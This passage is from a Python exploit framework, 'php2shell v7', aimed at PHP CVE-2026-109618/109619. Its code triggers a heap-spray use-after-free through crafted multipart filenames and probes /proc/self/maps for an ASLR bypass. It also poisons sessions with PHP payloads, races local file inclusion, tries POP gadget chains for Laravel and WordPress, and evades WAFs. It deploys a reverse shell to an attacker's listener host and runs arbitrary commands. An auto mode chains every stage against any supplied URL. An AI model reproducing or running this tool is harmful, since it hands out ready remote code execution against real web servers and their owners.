    num_refs: int = 2000,
    spray: bool = True,
    result: ExploitResult | None = None,
    dry_run: bool = False,
) -> requests.Response | None:
    """
    CVE-2026-109618 — trigger the use-after-free in var_unserializer.

    Overflow VAR_ENTRIES_MAX (1018) with >num_refs back-references so
    the extension chunks are freed before the destructor walk.  Heap
    spray (50 stdClass objects) attempts to reclaim the freed chunk
    with attacker data.  ~60% reliability (heap-layout dependent).
    """
    if dry_run:
        print(f"[DRY-RUN] Would trigger UAF with {num_refs} refs, spray={spray}")
        return None

    refs = ";".join([f"R:{i};" for i in range(2, num_refs + 2)])

    spray_block = ""
    if spray:
        spray_objs = "".join(
            [f's:{len(payload)}:"{payload}";' for _ in range(50)]
        )
        spray_block = f"a:50:{{{spray_objs}}}"

    uaf_payload = f"a:{num_refs + 1}:{{s:4:\"test\";{refs}{spray_block}}}"
    filename = f"uaf|{uaf_payload}"

    boundary = "----" + _rand(16)
    fields = [
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "value": "uaf_trigger"},
        {"name": "file", "filename": filename,
         "data": b"A" * 512, "content_type": "application/octet-stream"},
    ]
    body = build_multipart(fields, boundary)

    try:
        r = sess.post(
            url, data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            cookies={"PHPSESSID": sid},
            timeout=30,
        )
        if result:
            if r.status_code == 500:
                result.add(
                    "UAF triggered — server crashed (500)",
                    "critical",
                    f"Sent {num_refs} back-references ({'with' if spray else 'no'} spray).\n"
                    "Server crash confirms the use-after-free fires.",
                    evidence=r.text[:300], category="cat_c",
                )
            elif r.status_code == 200:
                result.add(
                    "UAF payload delivered (200)",
                    "high",
                    f"Sent {num_refs} refs. Server survived — heap layout needs tuning.",
                    evidence=r.text[:200], category="cat_c",
                )
            else:
                result.add(
                    f"UAF response: HTTP {r.status_code}",
                    "medium",
                    f"Unexpected status after {num_refs} refs.", category="cat_c",
                )
        return r
    except requests.ConnectionError:
        if result:
            result.add("UAF — connection killed", "critical",
                        f"Server dropped connection after {num_refs} refs.",
                        category="cat_c")
        return None
    except requests.RequestException:
        return None


def read_symbols(
    url: str,
    sess: requests.Session,
    result: ExploitResult,
) -> dict[str, bool]:
    """
    Probe for ELF symbol exposure / /proc/self/maps / phpinfo.
    Useful for ASLR bypass in UAF exploitation.
    """
    findings: dict[str, bool] = {}
    probes = [
        ("phpinfo", f"{url}?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"),
        ("proc_maps", f"{url}?file=/proc/self/maps"),
        ("proc_cmdline", f"{url}?file=/proc/self/cmdline"),
    ]
    for name, probe_url in probes:
        try:
            r = sess.get(probe_url, timeout=5)
            if r.status_code == 200 and len(r.text) > 100:
                findings[name] = True
                result.add(f"Symbol leak: {name}", "high",
                            f"Accessible at: {probe_url}",
                            evidence=r.text[:200], category="cat_c")
            else:
                findings[name] = False
        except requests.RequestException:
            findings[name] = False
    return findings


# ====================================================================
#  Post-exploitation
# ====================================================================

def deploy_reverse(
    url: str, sess: requests.Session, sid: str,
    lhost: str, lport: int, shell_type: str = "php_fsockopen",
    result: ExploitResult | None = None,
):
    template = REVERSE_SHELLS.get(shell_type)
    if template is None:
        print(f"[!] Unknown shell type: {shell_type}")
        return
    shell_code = template.format(host=lhost, port=lport)
    php_payload = f"<?php {shell_code} ?>"
    r = poison_session(url, sess, sid, php_payload)
    if result and r:
        result.add(f"Reverse shell ({shell_type}) deployed", "critical",
                    f"Listener: {lhost}:{lport}, SID: {sid}",
                    category="post_exploit")


def exec_cmd(
    url: str, sess: requests.Session, sid: str, cmd: str,
    result: ExploitResult | None = None,
) -> str | None:
    for fn in EXEC_FUNCTIONS:
        payload = f'<?php echo "START-{MARKER}"; {fn}("{cmd}"); echo "END-{MARKER}"; ?>'
        r = poison_session(url, sess, sid, payload)
        if r and f"START-{MARKER}" in r.text:
            output = r.text.split(f"START-{MARKER}", 1)[-1].split(f"END-{MARKER}", 1)[0]
            if result:
                result.add(f"Command executed via {fn}()", "critical",
                            f"Command: {cmd}", evidence=output.strip(),
                            category="post_exploit")
            return output.strip()
    return None


# ====================================================================
#  Orchestrator modes
# ====================================================================

def run_check(args, sess, result):
    print("\n[*] Mode: CHECK")
    return recon(args.url, sess, result)


def run_poison(args, sess, result):
    print("\n[*] Mode: POISON — session fixation + filename injection")
    sid = args.sid or _rand(26)
    payload = args.payload or f'<?php echo "{MARKER}"; system("id"); ?>'
    r = poison_session(args.url, sess, sid, payload,
                       progress_name=args.progress_name,
                       evasion=args.evasion)
    if r:
        result.add("Session poisoned", "high",
                    f"SID: {sid}\nPayload injected via upload_progress.",
                    evidence=f"HTTP {r.status_code} - {r.text[:200]}",
                    category="cat_a")


def run_race(args, sess, result):
    print("\n[*] Mode: RACE — poison + concurrent LFI include")
    sid = args.sid or _rand(26)
    payload = args.payload or f'<?php echo "{MARKER}"; system("id"); ?>'
    sp = args.session_path or "/tmp"
    lfi_url = args.lfi_url or args.url

    ok = race_a(
        args.url, lfi_url, sess, sid, payload, sp,
        threads=args.threads, rounds=args.rounds,
        progress_name=args.progress_name, result=result,
        dry_run=args.dry_run,
    )
    if not ok and not args.dry_run:
        result.add("Race condition did not land", "medium",
                    f"Tried {args.rounds} rounds x {args.threads} threads.\n"
                    "Target may have cleanup=Off, or the session path is wrong.",
                    category="cat_a")


def run_mismatch(args, sess, result):
    print("\n[*] Mode: MISMATCH — handler mismatch + POP gadget")
    sid = args.sid or _rand(26)
    cmd = args.payload or "id"

    detected = mismatch_detect(args.url, sess, sid, result)
    if detected or args.force:
        mismatch_exploit(
            args.url, sess, sid, cmd,
            framework=args.framework or args.gadget_name,
            gadget_raw=args.gadget,
            result=result, dry_run=args.dry_run,
        )


def run_uaf(args, sess, result):
    print("\n[*] Mode: UAF — CVE-2026-109618 back-reference overflow")
    sid = args.sid or _rand(26)
    payload = args.payload or f'<?php system("id"); ?>'
    trigger_uaf(args.url, sess, sid, payload,
                num_refs=args.uaf_refs, spray=not args.no_spray,
                result=result, dry_run=args.dry_run)


def run_oom(args, sess, result):
    print("\n[*] Mode: OOM — memory exhaustion probe")
    sid = args.sid or _rand(26)
    oom_probe(args.url, sess, sid,
              strategy=args.oom_strategy,
              rounds=args.oom_rounds,
              result=result, dry_run=args.dry_run)


def run_gadgets(args, sess, result):
    print("\n[*] Mode: GADGETS — testing all POP chains")
    sid = args.sid or _rand(26)
    cmd = args.payload or "id"
    for name, chain in GadgetChains.all_chains(cmd).items():
        print(f"  -> Trying {name} ...")
        mismatch_exploit(args.url, sess, sid, cmd,
                         gadget_raw=chain, result=result,
                         dry_run=args.dry_run)
        time.sleep(0.3)


def run_waf(args, sess, result):
    print("\n[*] Mode: WAF — testing multipart evasion techniques")
    sid = args.sid or _rand(26)
    payload = args.payload or f'<?php echo "{MARKER}"; ?>'
    techniques = [
        "lf_only", "double_cd", "mixed_case", "whitespace",
        "utf8_bom", "extra_semicolon", "null_padding",
    ]
    for tech in techniques:
        print(f"  -> Evasion: {tech}")
        r = poison_session(args.url, sess, sid, payload,
                           progress_name=args.progress_name, evasion=tech)
        if r:
            interesting = r.status_code not in (403, 405)
            result.add(
                f"WAF evasion: {tech} -> HTTP {r.status_code}",
                "high" if interesting else "info",
                f"Technique '{tech}' returned {r.status_code}.",
                evidence=r.text[:200], category="waf",
            )
        time.sleep(0.2)


def run_auto(args, sess, result):
    """Full automated chain: recon -> poison -> scan LFI -> race -> mismatch -> UAF."""
    print("\n[*] Mode: AUTO — full exploitation chain")

    info = recon(args.url, sess, result)
    if info.get("vulnerable") is False:
        print("[!] Target appears patched — continuing (may be spoofed).")

    sid = args.sid or _rand(26)
    args.sid = sid
    payload = args.payload or f'<?php echo "{MARKER}"; system("id"); ?>'
    args.payload = payload
    sp = args.session_path or "/tmp"

    # Step 1: poison
    print("\n[*] Step 1/5: Poisoning session ...")
    run_poison(args, sess, result)

    # Step 2: scan for LFI
    print("\n[*] Step 2/5: Scanning for LFI ...")
    lfi_url = discover_lfi(args.url, sess, sid, sp, result)

    # Step 3: race condition
    if lfi_url:
        print("\n[*] Step 3/5: Racing to include session ...")
        args.lfi_url = lfi_url.format("")
        run_race(args, sess, result)
    else:
        print("[!] Step 3/5: Skipped — no LFI found.")

    # Step 4: mismatch
    print("\n[*] Step 4/5: Handler mismatch probe + exploit ...")
    args.force = True
    run_mismatch(args, sess, result)

    # Step 5: UAF
    print("\n[*] Step 5/5: Triggering UAF (CVE-2026-109618) ...")
    run_uaf(args, sess, result)

    # Bonus: framework gadgets
    if info.get("framework"):
        print(f"\n[*] Bonus: gadget chains for {info['framework']} ...")
        cmd = f'echo {MARKER}-gadget'
        try:
            gadget = GadgetChains.for_framework(info["framework"], cmd)
            mismatch_exploit(args.url, sess, sid, cmd,
                             gadget_raw=gadget, result=result)
        except ValueError:
            pass


# ====================================================================
#  CLI
# ====================================================================

def main():
    print(BANNER)
    p = argparse.ArgumentParser(
        description="php2shell v7 — CVE-2026-109618/109619 exploit framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Categories:
          A  LFI Race     — session filename injection + include via race
          B  Mismatch     — cross-dir serialize handler confusion + POP chains
          C  OOM / UAF    — back-reference overflow triggers use-after-free

        Modes:
          auto      Full chain: recon -> poison -> LFI -> race -> mismatch -> UAF
          check     Fingerprint + recon only
          poison    Session poisoning via upload_progress
          race      Race condition: poison + concurrent LFI include
          mismatch  Handler mismatch detection + gadget exploitation
          uaf       CVE-2026-109618 UAF trigger
          oom       OOM / memory exhaustion probe
          gadgets   Test all POP chains
          waf       Test multipart WAF evasion techniques

        Examples:
          %(prog)s http://target/index.php
          %(prog)s http://target/index.php -m check
          %(prog)s http://target/index.php -m race --session-path /tmp --threads 20
          %(prog)s http://target/index.php -m mismatch --framework laravel
          %(prog)s http://target/index.php -m uaf --uaf-refs 3000
          %(prog)s http://target/index.php -m oom --oom-strategy files --oom-rounds 10
          %(prog)s http://target/index.php --lhost 10.0.0.1 --lport 4444
          %(prog)s http://target/index.php --cmd "id"
        """),
    )
    p.add_argument("url", help="Target URL (any .php endpoint)")
    p.add_argument(
        "-m", "--mode",
        choices=["auto", "check", "poison", "race", "mismatch", "uaf",
                 "oom", "gadgets", "waf"],
        default="auto",
        help="Operation mode (default: auto)",
    )

    g_sess = p.add_argument_group("Session")
    g_sess.add_argument("--sid", help="Force a specific PHPSESSID")
    g_sess.add_argument("-p", "--payload", help="Custom PHP payload")
    g_sess.add_argument("--progress-name", default="rce",
                         help="Upload progress key name")
    g_sess.add_argument("--session-path",
                         help="Server-side session save path")
    g_sess.add_argument("--lfi-url", help="URL with LFI (for race mode)")

    g_rev = p.add_argument_group("Post-exploitation")
    g_rev.add_argument("--lhost", help="Reverse shell listener host")
    g_rev.add_argument("--lport", type=int, help="Reverse shell listener port")
    g_rev.add_argument("--cmd", help="Command to execute (single-shot)")
    g_rev.add_argument("--shell-type", choices=list(REVERSE_SHELLS.keys()),
                        default="php_fsockopen", help="Reverse shell variant")

    g_gad = p.add_argument_group("Gadgets (Category B)")
    g_gad.add_argument("--gadget", help="Raw serialized gadget payload")
    g_gad.add_argument("--gadget-name",
                        choices=["laravel", "wordpress", "guzzle", "monolog"],
                        help="Named POP chain to use")
    g_gad.add_argument("--framework",
                        choices=list(FRAMEWORK_SIGNATURES.keys()),
                        help="Target framework for gadget selection")

    g_race = p.add_argument_group("Race (Category A)")
    g_race.add_argument("--threads", type=int, default=15,
                         help="Race threads (default: 15)")
    g_race.add_argument("--rounds", type=int, default=200,
                         help="Race rounds (default: 200)")

    g_uaf = p.add_argument_group("UAF (Category C)")
    g_uaf.add_argument("--uaf-refs", type=int, default=2000,
                        help="UAF back-reference count (default: 2000)")
    g_uaf.add_argument("--no-spray", action="store_true",
                        help="Disable heap spray in UAF")

    g_oom = p.add_argument_group("OOM (Category C)")
    g_oom.add_argument("--oom-strategy", choices=OOM_STRATEGIES,
                        default="mixed", help="OOM strategy (default: mixed)")
    g_oom.add_argument("--oom-rounds", type=int, default=5,
                        help="OOM rounds per strategy (default: 5)")

    g_waf = p.add_argument_group("WAF evasion")
    g_waf.add_argument("--evasion",
                        choices=["lf_only", "double_cd", "mixed_case",
                                 "whitespace", "utf8_bom",
                                 "extra_semicolon", "null_padding"],
                        help="WAF evasion technique for multipart")

    g_net = p.add_argument_group("Network")
    g_net.add_argument("-o", "--output", help="Save JSON report to file")
    g_net.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    g_net.add_argument("--timeout", type=int, default=15,
                        help="Request timeout in seconds")
    g_net.add_argument("-k", "--insecure", action="store_true",
                        help="Disable TLS verification")
    g_net.add_argument("--force", action="store_true",
                        help="Force exploit even if detection fails")
    g_net.add_argument("--dry-run", action="store_true",
                        help="Show what would be done without sending payloads")

    args = p.parse_args()

    if not args.url.startswith(("http://", "https://")):
        args.url = "http://" + args.url

    sess = _session(proxy=args.proxy, timeout=args.timeout,
                    verify=not args.insecure)
    result = ExploitResult(args.url)

    if not hasattr(args, "force"):
        args.force = False
    if not hasattr(args, "dry_run"):
        args.dry_run = False

    if not reachable(args.url, sess):
        print(f"[!] Target unreachable: {args.url}")
        sys.exit(1)

    print(f"[*] Target: {args.url}")
    print(f"[*] Marker: {MARKER}")

    if args.lhost and args.lport:
        sid = args.sid or _rand(26)
        deploy_reverse(args.url, sess, sid, args.lhost, args.lport,
                        shell_type=args.shell_type, result=result)
        result.summary()
        if args.output:
            result.save(args.output)
        return

    if args.cmd:
        sid = args.sid or _rand(26)
        out = exec_cmd(args.url, sess, sid, args.cmd, result=result)
        if out:
            print(f"\n{out}")
        result.summary()
        if args.output:
            result.save(args.output)
        return

    dispatch = {
        "auto": run_auto,
        "check": run_check,
        "poison": run_poison,
        "race": run_race,
        "mismatch": run_mismatch,
        "uaf": run_uaf,
        "oom": run_oom,
        "gadgets": run_gadgets,
        "waf": run_waf,
    }
    dispatch[args.mode](args, sess, result)

    result.summary()
    if args.output:
        result.save(args.output)


if __name__ == "__main__":
    main()
